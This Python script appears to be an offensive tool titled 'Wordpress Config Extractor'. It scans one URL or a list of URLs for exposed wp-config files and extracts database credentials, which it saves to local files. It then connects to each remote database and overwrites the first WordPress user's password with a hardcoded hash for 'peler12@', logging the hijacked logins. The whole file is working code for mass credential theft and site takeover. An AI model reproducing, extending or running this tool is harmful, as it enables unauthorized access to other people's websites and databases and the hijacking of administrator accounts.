import mysql.connector
import requests
import re
import argparse


class Connect:
    def __init__(self, host: str, user: str, password: str, database: str, table_prefix: str = 'wp_'):
        self.host = host
        self.user = user
        self.password = password
        self.database = database
        self.table_prefix = table_prefix
        self.user_password = "$P$BWcaOJsJx95iT1L38BPE32StxoWkji/"  # peler12@
        self.connection: mysql.connector.MySQLConnection = None

    @staticmethod
    def coloring_print(context: str, is_valid: bool = False):
        if is_valid == 'info':
            print('[\x1b[33m!\x1b[0m] ' + context + '\x1b[0m')
        elif is_valid:
            print('[\x1b[32m+\x1b[0m] ' + context + '\x1b[0m')
        else:
            print('[\x1b[31m-\x1b[0m] ' + context + '\x1b[0m')

    def connect(self, config_url: str):
        try:
            self.connection = mysql.connector.connect(
                host=self.host,
                user=self.user,
                password=self.password,
                database=self.database,
            )
            self.coloring_print(
                f"{self.user}@{self.host} connected to {self.database}", True)
            self.write_file(
                'db_valid.txt', f"Config Url: {config_url}\nHost: {self.host}\nUser: {self.user}\nPassword: {self.password}\nDatabase: {self.database}\n")
        except mysql.connector.Error as err:
            self.coloring_print(f"Error: {err}")

    def disconnect(self):
        self.connection.close()
        self.coloring_print(
            f"{self.user}@{self.host} disconnected from {self.database}", 'info')

    @staticmethod
    def write_file(file_name: str, data: str):
        with open(file_name, 'a') as f:
            f.write(data + '\n')

    def execute_cursor(self, command: str):
        try:
            cursor = self.connection.cursor(buffered=True)
            cursor.execute(command)
            return cursor
        except mysql.connector.Error as err:
            return False

    def commit(self):
        self.connection.commit()

    def get_user(self):
        table_name = self.table_prefix + 'users'
        resp = self.execute_cursor(f"SELECT * FROM {table_name}")
        fetch_data = resp.fetchone()
        if fetch_data is not None:
            return table_name, dict(zip(resp.column_names, fetch_data))
        self.coloring_print("No user found")
        return False

    def get_url(self):
        table_name = self.table_prefix + 'options'
        resp = self.execute_cursor(
            f"SELECT `option_value` FROM {table_name} WHERE `option_name` = 'siteurl'")
        fetch_data = resp.fetchone()
        if fetch_data is not None:
            return fetch_data[0]
        self.coloring_print("No URL found")
        return 'http://' + self.host

    def change_cred(self, config_url):
        if not self.connection:
            return False
        data = self.get_user()
        url = self.get_url()
        if data:
            table, user_data = data
            self.coloring_print(f"Found URL: {url}", True)
            self.coloring_print(f"Found user: {user_data['user_login']}", True)
            resp = self.execute_cursor(
                f"UPDATE `{table}` SET `user_pass` = '{self.user_password}' WHERE user_login = '{user_data['user_login']}'"
            )
            self.commit()
            self.write_file(
                'wp_user.txt', f"Config Url: {config_url}\nUrl: {url}\nUsername: {user_data['user_login']}\nPassword: peler12@\n")
            if resp.rowcount > 0:
                self.coloring_print(
                    f"User {user_data['user_login']} password changed to peler12@", True)
            else:
                self.coloring_print(
                    f"User {user_data['user_login']} password not changed or already changed to peler12@", True)
        self.disconnect()


class Parse:
    def __init__(self, url):
        self.url = url

    def add_http(self):
        if not self.url.startswith('http'):
            self.url = 'http://' + self.url

    def get_domain(self) -> str:
        return re.findall(r"(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)", self.url)[0]

    def request(self):
        Connect.coloring_print(f"Trying to connect to {self.url}", 'info')
        try:
            response = requests.get(self.url, timeout=70, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, verify=False)
            response_text = response.text
            if 'table_prefix' in response_text:
                host = re.findall(
                    r"(?<!\/\/)define\s?\(\s?[\'\"]DB_HOST[\'\"],\s?[\'\"](.+?)[\'\"]\s?\);", response_text)[0]
                user = re.findall(
                    r"(?<!\/\/)define\s?\(\s?[\'\"]DB_USER[\'\"],\s?[\'\"](.+?)[\'\"]\s?\);", response_text)[0]
                passwd = re.findall(
                    r"(?<!\/\/)define\s?\(\s?[\'\"]DB_PASSWORD[\'\"],\s?[\'\"](.+?)[\'\"]\s?\);", response_text)[0]
                database = re.findall(
                    r"(?<!\/\/)define\s?\(\s?[\'\"]DB_NAME[\'\"],\s?[\'\"](.+?)[\'\"]\s?\);", response_text)[0]
                table_prefix = re.findall(
                    "table_prefix.+?=\s?[\'\"](.+?)[\'\"]", response_text)[0]
                if host and user and passwd and database and table_prefix:
                    if 'localhost' in host or '127.0.0.1' in host or 'db:3306' in host:
                        host = self.get_domain()
                    Connect.coloring_print(
                        f"Found DB: {host}|{user}|{passwd}|{database}", True)
                    Connect.write_file(
                        'db.txt', f"DB Url: {self.url}\nHost: {host}\nUser: {user}\nPassword: {passwd}\nDatabase: {database}\n")
                    conn = Connect(host, user, passwd, database, table_prefix)
                    conn.connect(self.url)
                    conn.change_cred(self.url)
                else:
                    Connect.coloring_print("No DB found")
            else:
                Connect.coloring_print("Not a WordPress Config")
        except requests.exceptions.RequestException as e:
            Connect.coloring_print(f"Error: {e}", False)
        except IndexError as err:
            Connect.coloring_print(f"Error: {err}", False)
        finally:
            print()


def single(url: str):
    # url = input("Url ? ")
    parse = Parse(url)
    parse.add_http()
    parse.request()


def mass(url: str):
    # url = input("Url List ? ")
    list_urls = open(url, 'r').read().splitlines()
    for url in list_urls:
        parse = Parse(url)
        parse.add_http()
        parse.request()


def main():
    arg = argparse.ArgumentParser(description="Wordpress Config Extractor",
                                  usage="python3 wp_config.py -u <url> | -l <list_urls>")
    arg.add_argument("-u", "--url", help="Single URL")
    arg.add_argument("-l", "--list", help="List URLs")
    args = arg.parse_args()
    if args.url:
        single(args.url)
    elif args.list:
        mass(args.list)
    else:
        arg.print_help()


if __name__ == '__main__':
    main()
